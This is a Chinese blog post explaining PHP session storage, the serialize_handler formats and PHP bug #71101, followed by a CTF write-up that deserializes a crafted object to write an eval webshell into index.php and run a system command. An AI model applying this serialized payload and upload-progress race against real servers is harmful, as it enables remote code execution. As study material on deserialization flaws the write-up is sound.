\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnpanda.net\](https://www.cnpanda.net/sec/580.html)

前些天打了巅峰极客，遇到了一题 session 反序列化，借此机会整理一下 php session 反序列化的前生今世，愿与君共勉，如若有错，还望斧正

谈 `PHP session`之前，必须要知道什么是`session`，那么到底什么是`session`呢？

`Session`一般称为 “会话控制 “，简单来说就是是一种客户与网站 / 服务器更为安全的对话方式。一旦开启了 `session` 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种 “对话” 机制。不同语言的会话机制可能有所不同，这里仅讨论 `PHP session` 机制。

`PHP session` 可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，`PHP Session` 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 `session` 值会存储于服务器端，这也是与 `cookie` 的主要区别，所以`seesion` 的安全性相对较高。

会话的工作流程很简单，当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 `cookie`），如果发现请求的`Cookies`、`Get`、`Pos`t 中不存在`session id`，PHP 就会自动调用`php_session_create_id`函数创建一个新的会话，并且在`http response`中通过`set-cookie`头部发送给客户端保存，如下图：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142212-f2741128-f7b8-1.png)

有时候浏览器用户设置会禁止 `cookie`，当在客户端`cookie`被禁用的情况下，php 也可以自动将`session id`添加到 url 参数中以及`form`的`hidden` 字段中，但这需要将`php.ini`中的`session.use_trans_sid`设为开启，也可以在运行时调用`ini_set`来设置这个配置项。

会话开始之后，PHP 就会将会话中的数据设置到 `$_SESSION` 变量中，如下述代码就是一个在 `$_SESSION` 变量中注册变量的例子：

```
<?php
session\_start();
if (!isset($\_SESSION\['username'\])) {
  $\_SESSION\['username'\] = 'xianzhi' ;
}
?>

```

当 PHP 停止的时候，它会自动读取 `$_SESSION` 中的内容，并将其进行`序列化`， 然后发送给会话保存管理器来进行保存。

默认情况下，PHP 使用内置的文件会话保存管理器来完成`session`的保存，也可以通过配置项 `session.save_handler` 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项 `session.save_path` 所指定的位置。

整个流程大概如上所述，也可参考下述流程图：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142328-1fba974c-f7b9-1.png)

`PHP session`在`php.ini`中主要存在以下配置项：

*   session.gc\_divisor

php session 垃圾回收机制相关配置

*   session.sid\_bits\_per\_character

指定编码的会话 ID 字符中的位数

*   session.save\_path=""

该配置主要设置`session`的存储路径

*   session.save\_handler=""

该配置主要设定用户自定义存储函数，如果想使用 PHP 内置`session`存储机制之外的可以使用这个函数

*   session.use\_strict\_mode

严格会话模式，严格会话模式不接受未初始化的会话 ID 并重新生成会话 ID

*   session.use\_cookies

指定是否在客户端用 cookie 来存放会话 ID，默认启用

*   session.cookie\_secure

指定是否仅通过安全连接发送 `cookie`，默认关闭

*   session.use\_only\_cookies

指定是否在客户端_仅仅_使用 `cookie` 来存放会话 ID，启用的话，可以防止有关通过 URL 传递会话 ID 的攻击

*   session.name

指定会话名以用做 `cookie` 的名字，只能由字母数字组成，默认为 `PHPSESSID`

*   session.auto\_start

指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动

*   session.cookie\_lifetime

指定了发送到浏览器的 cookie 的生命周期，单位为秒，值为 0 表示 “直到关闭浏览器”。默认为 _0_

*   session.cookie\_path

指定要设置会话 `cookie` 的路径，默认为 _/_

*   session.cookie\_domain

指定要设置会话 `cookie` 的域名，默认为无，表示根据 `cookie` 规范产生 `cookie` 的主机名

*   session.cookie\_httponly

将 Cookie 标记为只能通过 HTTP 协议访问，即无法通过脚本语言（例如 JavaScript）访问 Cookie，此设置可以有效地帮助通过 XSS 攻击减少身份盗用

*   session.serialize\_handler

定义用来序列化 / 反序列化的处理器名字，默认使用`php`，还有其他引擎，且不同引擎的对应的 session 的存储方式不相同，具体可见下文所述

*   session.gc\_probability

该配置项与 `session.gc_divisor` 合起来用来管理 `garbage collection`，即垃圾回收进程启动的概率

*   session.gc\_divisor

该配置项与`session.gc_probability`合起来定义了在每个会话初始化时启动垃圾回收进程的概率

*   session.gc\_maxlifetime

指定过了多少秒之后数据就会被视为 “垃圾” 并被清除，垃圾搜集可能会在 `session` 启动的时候开始（ 取决于`session.gc_probability` 和 `session.gc_divisor`）

*   session.referer\_check

包含有用来检查每个 `HTTP Referer` 的子串。如果客户端发送了 `Referer` 信息但是在其中并未找到该子串，则嵌入的会话 ID 会被标记为无效。默认为空字符串

*   session.cache\_limiter

指定会话页面所使用的缓冲控制方法（`none/nocache/private/private_no_expire/public`）。默认为 `nocache`

*   session.cache\_expire

以分钟数指定缓冲的会话页面的存活期，此设定对 `nocache` 缓冲控制方法无效。默认为 180

*   session.use\_trans\_sid

指定是否启用透明 SID 支持。默认禁用

*   session.sid\_length

配置会话 ID 字符串的长度。 会话 ID 的长度可以在 22 到 256 之间。默认值为 32。

*   session.trans\_sid\_tags

指定启用透明 sid 支持时重写哪些 HTML 标签以包括会话 ID

*   session.trans\_sid\_hosts

指定启用透明 sid 支持时重写的主机，以包括会话 ID

*   session.sid\_bits\_per\_character

配置编码的会话 ID 字符中的位数

*   session.upload\_progress.enabled

启用上传进度跟踪，并填充`$ _SESSION`变量， 默认启用。

*   session.upload\_progress.cleanup

读取所有 POST 数据（即完成上传）后，立即清理进度信息，默认启用

*   session.upload\_progress.prefix

配置`$ _SESSION`中用于上传进度键的前缀，默认为 `upload_progress_`

*   session.upload\_progress.name

`$ _SESSION`中用于存储进度信息的键的名称，默认为`PHP_SESSION_UPLOAD_PROGRESS`

*   session.upload\_progress.freq

定义应该多长时间更新一次上传进度信息

*   session.upload\_progress.min\_freq

更新之间的最小延迟

*   session.lazy\_write

配置会话数据在更改时是否被重写，默认启用

以上配置项涉及到的安全比较多，如会话劫持、XSS、CSRF 等，这些不是本文的主题，故不在赘述，在这里主要来具体谈一谈`session.serialize_handler` 配置项

上文中提到了 `PHP session`的存储机制是由`session.serialize_handler` 来定义引擎的，默认是以文件的方式存储，且存储的文件是由`sess_sessionid`来决定文件名的，当然这个文件名也不是不变的，如`Codeigniter`框架的 `session`存储的文件名为`ci_sessionSESSIONID`，如下图所示：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142528-67263294-f7b9-1.png)

当然，文件的内容始终是 session 值的序列化之后的内容：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142445-4dd97c2e-f7b9-1.png)

`session.serialize_handler` 定义的引擎有三种，如下表所示：

<table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_serialize</td><td>经过 serialize() 函数序列化处理的<strong>数组</strong></td></tr></tbody></table>

**注：自 PHP 5.5.4 起可以使用 _php\_serialize_**

上述三种处理器中，`php_serialize` 在内部简单地直接使用 `serialize/unserialize` 函数，并且不会有 `php` 和 `php_binary` 所具有的限制。 使用较旧的序列化处理器导致 `$_SESSION` 的索引既不能是数字也不能包含特殊字符 (`|` 和 `!`) 。

下面我们实例来看看三种不同处理器序列化后的结果。

php 处理器
-------

首先来看看`session.serialize_handler`等于 `php`时候的序列化结果，demo 如下：

```
<?php
error\_reporting(0);
ini\_set('session.serialize\_handler','php');
session\_start();
$\_SESSION\['session'\] = $\_GET\['session'\];
?>

```

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142611-80d4aebe-f7b9-1.png)

序列化的结果为：`session|s:7:"xianzhi";`

`session` 为`$_SESSION['session']`的键名，`|`后为传入 GET 参数经过序列化后的值

php\_binary 处理器
---------------

再来看看`session.serialize_handler`等于 `php_binary`时候的序列化结果。

demo 如下：

```
<?php
error\_reporting(0);
ini\_set('session.serialize\_handler','php\_binary');
session\_start();
$\_SESSION\['sessionsessionsessionsessionsession'\] = $\_GET\['session'\];
?>

```

为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为`#`，所以最终的结果如下图所示：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142644-94a3c182-f7b9-1.png)

序列化的结果为：`#sessionsessionsessionsessionsessions:7:"xianzhi";`

`#`为键名长度对应的 ASCII 的值，`sessionsessionsessionsessionsessions`为键名，`s:7:"xianzhi";`为传入 GET 参数经过序列化后的值

php\_serialize 处理器
------------------

最后就是`session.serialize_handler`等于 `php_serialize`时候的序列化结果，同理，demo 如下：

```
<?php
error\_reporting(0);
ini\_set('session.serialize\_handler','php\_serialize');
session\_start();
$\_SESSION\['session'\] = $\_GET\['session'\];
?>

```

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142725-acc1d2b8-f7b9-1.png)

序列化的结果为：`a:1:{s:7:"session";s:7:"xianzhi";}`

`a:1`表示`$_SESSION`数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值

这个 BUG 是由乌云白帽子`ryat`师傅于`2015-12-12`在 php 官网上提出来的，他给了一个 payload，内容如下：

```
<form action =“ upload.php” method =“ POST” enctype =“ multipart / form-data”>
    <input type =“ hidden” name =“ PHP\_SESSION\_UPLOAD\_PROGRESS” value =“ ryat” />
    <input type =“ file” name =“ file” />
    <input type =“ submit” />
</ form>

```

然后`$_SESSION`中的键值就会为`$_SESSION["upload_progress_ryat"]`，在会话上传过程中，将对会话数据进行序列化 / 反序列化，序列化格式由`php.ini`中的`session.serialize_handler`选项设置。 这意味着，如果在脚本中设置了不同的`serialize_handler`，那么可以导致注入任意`session`数据。

上面的解释可能看起来有些绕，简单来说`php`处理器和`php_serialize`处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。

形成的原理就是在用`session.serialize_handler = php_serialize`存储的字符可以引入 | , 再用`session.serialize_handler = php`格式取出`$_SESSION`的值时， `|`会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。

举个简单的例子。

定义一个`session.php`文件，用于传入 `session`值，文件内容如下：

```
<?php
error\_reporting(0);
ini\_set('session.serialize\_handler','php\_serialize');
session\_start();
$\_SESSION\['session'\] = $\_GET\['session'\];
?>

```

先看看`session`的初始内容，如下：

`a:1:{s:7:"session";s:5:"hello";}`

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142805-c4d4f420-f7b9-1.png)

存在另一个`class.php` 文件，内容如下：

```
<?php
    error\_reporting(0);
  ini\_set('session.serialize\_handler','php');
  session\_start();
    class XianZhi{
    public $name = 'panda';
    function \_\_wakeup(){
      echo "Who are you?";
    }
    function \_\_destruct(){
      echo '<br>'.$this->name;
    }
  }
  $str = new XianZhi();
 ?>

```

访问该页面可以看到：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142839-d8f76b86-f7b9-1.png)

实例化对象后，输出了`panda`

这两个文件的作用很清晰，`session.php`文件的处理器是`php_serialize`，`class.php`文件的处理器是`php`，`session.php`文件的作用是传入可控的 `session` 值，`class.php`文件的作用是在反序列化开始前输出`Who are you?`，反序列化结束的时候输出`name`值。

这两个文件如果想要利用 `php bug #71101`，我们要在`session.php`文件传入`|`+`序列化`格式的值，然后再次访问`class.php`文件的时候，就会在调用`session`值的时候，触发此 BUG。

首先生成序列化字符串，利用 payload 如下

```
<?php
  
class XianZhi{
    public $name;
    function \_\_wakeup(){
      echo "Who are you?";
    }
    function \_\_destruct(){
      echo '<br>'.$this->name;
    }
}
    $str = new XianZhi();
    $str->name = "xianzhi";
    echo serialize($str);
  ?>

```

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026142947-01e2b4d8-f7ba-1.png)

payload：`O:7:"XianZhi":1:{s:4:"name";s:7:"xianzhi";}`

然后传入`session.php`：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026143020-156f6712-f7ba-1.png)

此时的 `session`内容如下：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026143035-1e764baa-f7ba-1.png)

`a:1:{s:7:"session";s:44:"|O:7:"XianZhi":1:{s:4:"name";s:7:"xianzhi";}";}`

再次访问`class.php`文件的时候，就会发现已经触发了 `php bug #71101`，如下图所示：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026143047-2590dbc6-f7ba-1.png)

这仅仅是一个简单的赋值、取值的问题举例，并没有涉及到如何控制 `session` 值的问题，下面我通过 2019 年巅峰极客大赛的 `lol`这个`php session`反序列化题进行实例说明。

这题比赛的时候我们队把源码扣了下来，可能有些页面不全，但是不影响做题，题目的结构如下：

```
├── app
│   ├── controller
│   │   ├── Files.class.php
│   │   └── IndexController.class.php
│   ├── model
│   │   └── Download.class.php
│   └── view
│       └── Cache.class.php
├── core
│   ├── config.php
│   ├── core.php
│   └── func.php
├── index.php
├── upload
│   └── e9ovitochivkoamlodj6vu9g7g
└── user


```

在`config.php`文件中找到了一个比较醒目的提示：

```
<?php
$config=array(
    'debug'=>'false',
    'ini'=>array(
        'session.name' => 'PHPSESSID',
        'session.serialize\_handler' => 'php'
    )
);


```

是的，就是上文中提到的`session.serialize_handler`，那么再来看看在什么地方开启了`session`，经过查找，在`/core/core.php`文件中看到：

```
<?php

if(!defined('Core\_DIR')){
    exit();
}

include(Core\_DIR.DS.'config.php');
include(Core\_DIR.DS.'func.php');

\_if\_debug($config\['debug'\]);
spl\_autoload\_register('autoload\_class');
config($config\['ini'\]);


session\_start();
define('Upload\_DIR',Image\_DIR.DS.session\_id());
init();

$app = new IndexController();

if(method\_exists($app, $app->data\['method'\])){
    $app->{$app->data\['method'\]}($app->data\['param'\]);
}else{
    $app->index();
}




```

主要是

```
config($config\['ini'\]);
session\_start();


```

这两局，说明是有读取 session 值的，前面也说了，既然是 php session 反序列化题，那第一步要做的肯定是寻找可控`session`的点，经过寻找，在`app/model/Cache.class.php`文件中找到，文件内容如下：

```
<?php
class Cache{
    public $data;
    public $sj;
    public $path;
    public $html;
    function \_\_construct($data){
        $this->data\['name'\]=isset($data\['post'\]\['name'\])?$data\['post'\]\['name'\]:'';
        $this->data\['message'\]=isset($data\['post'\]\['message'\])?$data\['post'\]\['message'\]:'';
        $this->data\['image'\]=!empty($data\['image'\])?$data\['image'\]:'/static/images/pic04.jpg';
        $this->path=Cache\_DIR.DS.session\_id().'.php';
    }

    function \_\_destruct(){
        $this->html=sprintf('<!DOCTYPE HTML><html><head><title>LOL</title><meta charset="utf-8" /><meta ></script>    </body></html>',substr($this->data\['name'\],0,62),$this->data\['image'\],$this->data\['message'\],session\_id().'.jpg');

        if(file\_put\_contents($this->path,$this->html)){
            include($this->path);
        }
    }
}


```

在 cache 类中，`name`和`message`的值通过 POST 请求得到，然后在传入到 `path`页面，这样一来，就很清楚了，我们控制`name`和`message`一个变量的值，然后再选择一个`path`，最终会在我们选择的`path`页面生成我们想要的东西，payload 如下：

```
<?php

class Cache{
    public $data ;
    public $sj;
    public $path = '/Library/WebServer/Documents/ctf/index.php';
    public $html;

}
    $str = new Cache();
    $str->data= \[
    "name" => "payload",
    "message" => "panda",
    "image" => "panda"
\];
    echo serialize($str);

?>


```

生成序列化值如下：

```
O:5:"Cache":4:{s:4:"data";a:3:{s:4:"name";s:7:"payload";s:7:"message";s:5:"panda";s:5:"image";s:5:"panda";}s:2:"sj";N;s:4:"path";s:42:"/Library/WebServer/Documents/ctf/index.php";s:4:"html";N;}


```

然后将 `name` 中`payload`的值改成`<?php eval($_GET[1]);?>`，如下：

```
O:5:"Cache":4:{s:4:"data";a:3:{s:4:"name";s:23:"<?php eval($\_GET\[a\]);?>";s:7:"message";s:5:"panda";s:5:"image";s:5:"panda";}s:2:"sj";N;s:4:"path";s:42:"/Library/WebServer/Documents/ctf/index.php";s:4:"html";N;}


```

再利用上文中提到的`PHP BUG #71101`，建立 `up.html` 页面，页面内容如下：

```
<form action="http://10.37.14.49/ctf/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden"  />
    <input type="file"  />
    <input type="submit" />
</form>


```

抓包，修改 `value` 的值，如下图所示：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026143120-38e1af5c-f7ba-1.png)

由于请求后，`session`会立刻被清空覆盖

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026143133-40d02590-f7ba-1.png)

因此需要不断发送请求，这里可以写脚本，也可以直接利用 burp ，我偷个懒直接利用 burp ：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026143150-4b27d8d0-f7ba-1.png)

然后 index.php 的内容就会修改成以下内容：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026143204-5312300e-f7ba-1.png)

直接向`index.php`页面发送`?a=system('cat /Library/WebServer/Documents/ctf/flag');`请求即可得到 flag

![](https://xzfile.aliyuncs.com/media/upload/picture/20191026143654-001a577c-f7bb-1.png)

通过本次对 `PHP session`的梳理分析，希望让你对其有了更好的认识和理解，有问题欢迎反馈交流

[https://blog.csdn.net/m0\_37421065/article/details/78930935](https://blog.csdn.net/m0_37421065/article/details/78930935)

[https://www.php.net/manual/zh/session.configuration.php](https://www.php.net/manual/zh/session.configuration.php)

[https://bugs.php.net/bug.php?id=71101](https://bugs.php.net/bug.php?id=71101)

[https://blog.spoock.com/2016/10/16/php-serialize-problem/](https://blog.spoock.com/2016/10/16/php-serialize-problem/)

[https://www.ctolib.com/topics-81497.html](https://www.ctolib.com/topics-81497.html)

附件：[https://xzfile.aliyuncs.com/upload/affix/20191026143810-2d53db1e-f7bb-1.zip](https://xzfile.aliyuncs.com/upload/affix/20191026143810-2d53db1e-f7bb-1.zip)

注：本文章首发于先知社区  
源地址：[https://xz.aliyun.com/t/6640](https://xz.aliyun.com/t/6640)

使用微信扫描二维码完成支付

![](https://www.cnpanda.net/usr/themes/sec/img/alipay-2.jpg)